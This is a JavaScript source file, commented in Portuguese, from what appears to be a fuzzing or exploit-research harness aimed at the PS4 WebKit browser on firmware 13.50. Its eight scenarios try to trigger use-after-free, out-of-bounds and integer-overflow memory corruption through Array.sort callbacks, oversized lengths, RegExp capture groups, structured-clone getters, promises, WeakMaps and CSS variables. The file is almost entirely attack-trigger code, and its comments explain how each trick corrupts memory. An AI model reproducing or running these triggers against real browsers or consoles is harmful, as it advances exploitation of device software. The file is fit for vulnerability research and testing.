/**
 * MOD_FACTORY.JS — Cenários de UAF para PS4 WebKit FW 13.50
 *
 * Cada cenário implementa o ciclo completo de um UAF:
 *   setup()   → cria o objeto alvo e a infraestrutura necessária
 *   trigger() → executa a ação que LIBERA o objeto nativo (free)
 *   probe[]   → lista de funções que ACESSAM o objeto pós-free
 *   cleanup() → remove efeitos colaterais do DOM/contexto
 *
 * As probes recebem o próprio cenário (`s`) como parâmetro
 * para acessar `s.video`, `s.ctx`, etc. de forma explícita.
 *
 * Superfícies de alta prioridade para PS4 FW 13.50:
 *   - MediaPlayerPrivateManx / FullscreenVideoController
 *   - WebAudio graph (AudioContext.close → nodes órfãos)
 *   - MediaSource pipeline teardown
 *   - SVG RenderSVGResourceFilter lifetime
 *   - FrameLoader / Frame teardown via document.write
 *   - MessagePort ownership transfer
 */

export const Factory = {

    buildScenarios: function() {
        const list = [];

        const register = (scenario) => {
            // Verifica suporte de API antes de adicionar
            try {
                if (scenario.supported && scenario.supported() === false) return;
                list.push(scenario);
            } catch(e) {}
        };


        

 

 // ══════════════════════════════════════════════════════════════
        // 10. Native C++ Callback Mutation (No-JIT OOB/Type Confusion)
        //     C++: ArrayPrototype.cpp / std::sort
        //     Risco: ALTO — O vetor principal para ambientes com JIT desativado.
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'NATIVE_CALLBACK_MUTATION_UAF',
            category: 'CoreJS',
            risk: 'HIGH',
            description: [
                'Ataca funções nativas em C++ que executam callbacks JS (ex: Array.sort).',
                'O algoritmo de ordenação nativo do WebKit pode fazer cache do tamanho',
                'ou do ponteiro do Butterfly. Se o nosso callback encolher o array para 0 e acionar o GC,',
                'quando o C++ voltar, ele vai escrever ou ler fora dos limites (OOB).'
            ].join(' '),

            setup: function() {
                // Criamos um array grande o suficiente para não ser ordenado de forma trivial
                this.vulnArray = [];
                for (let i = 0; i < 50; i++) {
                    this.vulnArray.push(1.1 + i);
                }
                
                // Variável de controle para acionar o ataque apenas uma vez
                this.attacked = false;
            },

            trigger: function() {
                try {
                    // Chamamos a função nativa C++
                    this.vulnArray.sort((a, b) => {
                        if (!this.attacked) {
                            this.attacked = true;
                            
                            // O GATILHO: Enquanto o C++ está no meio da ordenação,
                            // nós destruímos o array por baixo dos pés dele!
                            this.vulnArray.length = 0;
                            
                            // Forçamos o GC a limpar o Butterfly antigo
                            let trash = [];
                            for(let i = 0; i < 20; i++) trash.push(new ArrayBuffer(1024 * 512));
                            trash = null;
                        }
                        return a - b;
                    });
                } catch(e) {
                    // Se o WebKit crashar aqui (TypeError ou Segfault), achamos um bug C++.
                }
            },

            probe: [
                s => s.vulnArray.length, // Deveria ser 0. Se o C++ forçou outro valor, temos corrupção.
                s => s.vulnArray[0],     // Se lermos dados aqui, estamos lendo memória freed (OOB Read)
                s => s.vulnArray[49],    // Tentativa de leitura na cauda do array destruído
                
                // Se o valor retornado não for 'undefined' (já que o array tem tamanho 0),
                // o C++ ignorou a nossa mutação e leu o bloco de memória fantasma.
                s => typeof s.vulnArray[0] 
            ],

            cleanup: function() {
                this.vulnArray = null;
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 11. Integer Overflow Direto (O(1) Boundary Bypass)
        //     C++: JSArray.cpp / JSGenericTypedArrayView.cpp
        //     Risco: ALTO — Estouro sem travamento da CPU (No Hang)
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'ARRAY_MATH_INTEGER_OVERFLOW',
            category: 'Boundary',
            risk: 'HIGH',
            description: [
                'Testa o transbordo de inteiros sem funções iterativas (evitando CPU Hang).',
                'Foca no array.push() num array de tamanho máximo (0xFFFFFFFF) e',
                'na criação de TypedArrays com offsets que estouram os 32 bits.'
            ].join(' '),

            setup: function() {
                this.vulnArray = [];
                // Colocamos o array no limite de 32-bits sem preencher a RAM
                this.vulnArray.length = 0xFFFFFFFF; 
                
                // O Buffer isca para o TypedArray Overflow
                this.buffer = new ArrayBuffer(8);
            },

            trigger: function() {
                try {
                    // GATILHO 1: O(1) Push Overflow
                    // O C++ tentará fazer 0xFFFFFFFF + 1. Se usar uma variável
                    // de 32 bits (uint32_t), isso dá a volta para 0!
                    this.vulnArray.push(1337); 
                } catch(e) {}

                try {
                    // GATILHO 2: TypedArray Constructor Overflow
                    // Tentamos criar uma View (DataView/Uint8Array) que começa num
                    // offset gigantesco. Se a soma do offset + tamanho exceder
                    // os 32 bits e o WebKit não verificar direito, a View é criada 
                    // a apontar para memória inválida (OOB Read/Write imediato).
                    this.view = new Uint8Array(this.buffer, 0xFFFFFFFF, 1);
                } catch(e) {
                    // RangeError esperado se o WebKit estiver blindado.
                }
            },

            probe: [
                // Se o push() deu a volta para zero, length será 0 em vez de dar erro.
                s => s.vulnArray.length,
                
                // Se a View for criada, a proteção falhou brutalmente.
                s => s.view ? s.view.byteOffset : null,
                
                // Tentativa de ler o conteúdo da View corrompida (memória nativa vazada)
                s => s.view ? s.view[0] : null
            ],

            cleanup: function() {
                this.vulnArray = null;
                this.buffer = null;
                this.view = null;
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 12. String Math Integer Overflow (O(1) Boundary Bypass)
        //     C++: WTFString.cpp 
        //     Risco: ALTO — Tenta enganar o cálculo de alocação sem esgotar a RAM
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'STRING_MATH_INTEGER_OVERFLOW',
            category: 'Boundary',
            risk: 'HIGH',
            description: [
                'Testa o transbordo de inteiros na matemática de strings do WebKit.',
                'Utiliza funções que calculam o tamanho final (length) antes de iterar,',
                'evitando o travamento da CPU. Se o cálculo de 32-bits der a volta,',
                'a string resultante apontará para memória inválida.'
            ].join(' '),

            setup: function() {
                // Usamos uma string minúscula para não esgotar a RAM da PS4
                this.smallStr = "A";
            },

            trigger: function() {
                try {
                    // GATILHO 1: O motor C++ vai calcular: 1 (tamanho) * 0xFFFFFFFF
                    // Se o resultado for truncado (Integer Overflow), ele aloca 0 bytes,
                    // mas tenta escrever o "A" nessa memória!
                    this.corrupted = this.smallStr.repeat(0xFFFFFFFF);
                } catch(e) { }

                try {
                    // GATILHO 2: PadStart
                    // O C++ tenta calcular a diferença: 0xFFFFFFFF - 1
                    this.corrupted = this.smallStr.padStart(0xFFFFFFFF, "B");
                } catch(e) { }
            },

            probe: [
                // Se a string foi criada sem lançar RangeError, o cálculo falhou.
                s => s.corrupted ? s.corrupted.length : null,
                
                // Tentativa de ler a memória alocada incorretamente
                s => s.corrupted ? s.corrupted.charCodeAt(0) : null
            ],

            cleanup: function() {
                this.smallStr = null;
                this.corrupted = null;
            }
        });
        
        // ══════════════════════════════════════════════════════════════
        // 13. RegExp Capture Group Limit (Parser Heap Overflow)
        //     C++: Yarr (WebKit Regex Engine)
        //     Risco: ALTO — Ataca os limites do parser sem causar ReDoS
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'REGEXP_GROUP_INTEGER_OVERFLOW',
            category: 'Boundary',
            risk: 'HIGH',
            description: [
                'Em vez de causar Catastrophic Backtracking (CPU Hang), ataca o buffer',
                'de alocação de grupos de captura () do compilador C++. Se o limite',
                'exceder 16-bits ou 32-bits, o motor pode subscrever os metadados do RegExp.'
            ].join(' '),

            setup: function() {
                // Criamos uma expressão com milhares de grupos de captura válidos.
                // Isto testa se o parser em C++ estoura o contador interno (uint16_t ou uint32_t)
                // ao pré-alocar os arrays de resultados, sem causar loops infinitos.
                try {
                    // 0xFFFF é o limite de 16-bits. Passar disso pode bugar o WebKit antigo.
                    let groups = "()".repeat(0xFFFF + 1); 
                    this.regex = new RegExp(groups);
                } catch(e) {}
            },

            trigger: function() {
                try {
                    if (this.regex) {
                        // Uma execução instantânea (vazia). O foco aqui é forçar
                        // o C++ a devolver o array massivo de grupos de captura.
                        this.result = this.regex.exec("");
                    }
                } catch(e) {}
            },

            probe: [
                // Se o tamanho do resultado for menor que o esperado, ocorreu um transbordo (wrap-around)
                s => s.result ? s.result.length : null,
                
                // Tenta aceder ao primeiro índice da memória possivelmente corrompida
                s => s.result ? s.result[1] : null
            ],

            cleanup: function() {
                this.regex = null;
                this.result = null;
            }
        });
        // ══════════════════════════════════════════════════════════════
        // 14. Structured Clone Getter Mutation (Worker postMessage)
        //     C++: SerializedScriptValue.cpp / CloneSerializer
        //     Risco: CRÍTICO — Causa OOB Read/Write durante cópia de memória
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'STRUCTURED_CLONE_MUTATION',
            category: 'Concurrency',
            risk: 'HIGH',
            description: [
                'Ataca o algoritmo de clonagem estrutural (Structured Clone) usado pelo postMessage.',
                'Enviamos um objeto com um Getter malicioso. O C++ começa a calcular o tamanho da memória',
                'necessária para a cópia. Quando ele acede ao Getter, nós destruímos a estrutura do objeto.',
                'O C++ retoma a cópia usando o tamanho antigo, mas lendo a estrutura nova (OOB/UAF).'
            ].join(' '),

            setup: function() {
                this.vulnArray = [1.1, 2.2, 3.3, 4.4];
                this.channel = new MessageChannel();
                
                // O objeto bomba
                this.evilPayload = {
                    a: 1,
                    b: 2,
                    // Este getter será executado PELO C++ durante o processo de cópia!
                    get c() {
                        // O GATILHO: Encolhemos o array para zero enquanto o C++ está a copiar
                        this.vulnArray.length = 0;
                        
                        // Forçamos pressão de memória síncrona
                        let trash = [];
                        for(let i=0; i<10; i++) trash.push(new ArrayBuffer(1024*512));
                        return 3;
                    }
                };
                // Injetamos a referência para o array dentro do objeto a ser clonado
                this.evilPayload.d = this.vulnArray; 
            },

            trigger: function() {
                try {
                    // Iniciamos a clonagem assíncrona. O WebKit vai iterar sobre {a, b, c, d}.
                    // Ao ler 'c', a nossa armadilha dispara, corrompendo 'd' antes de ele ser clonado.
                    this.channel.port1.postMessage(this.evilPayload);
                } catch(e) {}
            },

            probe: [
                // Verificamos se o array original sobreviveu à mutação do C++
                s => s.vulnArray.length,
                // Tentativa de ler memória órfã (Stale Pointer)
                s => s.vulnArray[0]
            ],

            cleanup: function() {
                this.vulnArray = null;
                this.evilPayload = null;
                try { this.channel.port1.close(); } catch(e){}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 15. Promise Microtask UAF (Garbage Collection Race)
        //     C++: JSPromise.cpp / MicrotaskQueue
        //     Risco: ALTO — Tenta forçar GC enquanto uma Promise está no limbo
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'PROMISE_MICROTASK_UAF',
            category: 'Concurrency',
            risk: 'HIGH',
            description: [
                'Abusa da fila de microtarefas do Event Loop. Resolvemos uma Promise e',
                'imediatamente apagamos a referência e forçamos o GC. Quando o callback',
                'do .then() for executado pelo C++ no fim do ciclo, o contexto pode já',
                'ter sido parcialmente libertado.'
            ].join(' '),

            setup: function() {
                this.resolver = null;
                this.promise = new Promise(resolve => {
                    this.resolver = resolve;
                });
                
                this.leakedData = "Seguro";
                
                // O callback que será agendado na fila do C++
                this.promise.then(() => {
                    try {
                        // Se o 'this' estiver corrompido, isto causará anomalias
                        this.leakedData = this.promise ? "Ainda Vivo" : "Contexto Fantasma";
                    } catch(e) {
                        this.leakedData = "Crash/TypeError";
                    }
                });
            },

            trigger: function() {
                // 1. Resolvemos a Promise (coloca o callback na Microtask Queue do C++)
                this.resolver();
                
                // 2. Destruímos a referência original no JS
                this.promise = null;
                this.resolver = null;
                
                // 3. (O GC forçado já é executado pelo mod_executor logo após o trigger)
            },

            probe: [
                // Verifica o estado da variável alterada dentro da microtarefa
                s => s.leakedData
            ],

            cleanup: function() {
                this.leakedData = null;
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 16. WeakMap GC Ephemeron Desync (Timing UAF)
        //     C++: WeakMapImpl.cpp / EphemeronTable
        //     Risco: ALTO — Tenta corromper a tabela interna do GC
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'WEAKMAP_EPHEMERON_UAF',
            category: 'CoreJS',
            risk: 'HIGH',
            description: [
                'Usa um WeakMap para ligar um objeto (Chave) a um Array (Valor).',
                'Destrói a chave e força o GC. A tabela de Ephemerons do WebKit deve',
                'remover o valor assincronamente. Se acedermos ao mapa durante essa janela',
                'de limpeza (Sweeping Phase), o C++ pode devolver um ponteiro para um valor já libertado.'
            ].join(' '),

            setup: function() {
                this.wm = new WeakMap();
                this.vulnArray = [1.1, 2.2, 3.3, 4.4];
                
                // A chave tem de ser um objeto
                this.keyObj = document.createElement('div');
                
                // Ligamos a chave ao array
                this.wm.set(this.keyObj, this.vulnArray);
            },

            trigger: function() {
                try {
                    // 1. Apagamos a referência primária à chave e ao array
                    this.keyObj = null;
                    this.vulnArray = null;
                    
                    // (O mod_executor fará o GC em seguida).
                    // O motor interno do WeakMap entrará em pânico para limpar a entrada.
                } catch(e) {}
            },

            probe: [
                // Tentativa cega: O array original devia estar morto, mas se o recuperarmos 
                // por outras vias (ou se a memória dele vazar para um novo objeto), temos um UAF.
                // Como perdemos a referência, vamos verificar se o WeakMap corrompeu o próprio tamanho (se suportado internamente)
                s => s.wm.has(s.keyObj), // Deveria ser TypeError ou false
            ],

            cleanup: function() {
                this.wm = null;
                this.keyObj = null;
                this.vulnArray = null;
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 17. CSS Custom Properties Cascade Teardown
        //     C++: CSSVariableReferenceValue.cpp / StyleResolver
        //     Risco: CRÍTICO — Histórico gigantesco de UAFs no WebKit
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'CSS_CUSTOM_PROPERTY_UAF',
            category: 'Rendering',
            risk: 'HIGH',
            description: [
                'Cria uma cascata profunda de Variáveis CSS que se referenciam mutuamente.',
                'Enquanto o StyleResolver (C++) está a recalcular o layout, removemos os',
                'elementos do DOM e forçamos a limpeza do cache de estilos.',
                'Referências internas para blocos de CSS desanexados podem ser usadas após o free.'
            ].join(' '),

            setup: function() {
                this.parent = document.createElement('div');
                this.child = document.createElement('div');
                
                // Cascata maliciosa: A propriedade do filho depende do pai
                this.parent.style.setProperty('--fuzz-base', '100px');
                this.child.style.setProperty('width', 'calc(var(--fuzz-base) * 2)');
                
                this.parent.appendChild(this.child);
                document.body.appendChild(this.parent);
                
                // Forçamos o WebKit a calcular e fazer cache dos estilos no C++
                this.initialWidth = getComputedStyle(this.child).width;
            },

            trigger: function() {
                try {
                    // O GATILHO: Removemos a base da cascata e o elemento simultaneamente
                    this.parent.style.removeProperty('--fuzz-base');
                    this.parent.remove();
                    
                    // Forçamos um recalculo instantâneo de um elemento órfão
                    this.child.style.setProperty('--fuzz-base', '200px');
                    void this.child.offsetWidth; // Força Layout síncrono no C++
                } catch(e) {}
            },

            probe: [
                // Lemos as propriedades computadas do elemento órfão.
                // Se o C++ estiver a ler o cache libertado, isto devolve valores residuais 
                // da memória em vez de falhar ou devolver o padrão (auto).
                s => getComputedStyle(s.child).width,
                s => s.child.style.getPropertyValue('--fuzz-base')
            ],

            cleanup: function() {
                try { 
                    this.parent.remove(); 
                    this.child.remove();
                } catch(e) {}
                this.parent = null;
                this.child = null;
            }
        });
        return list;
    }
};
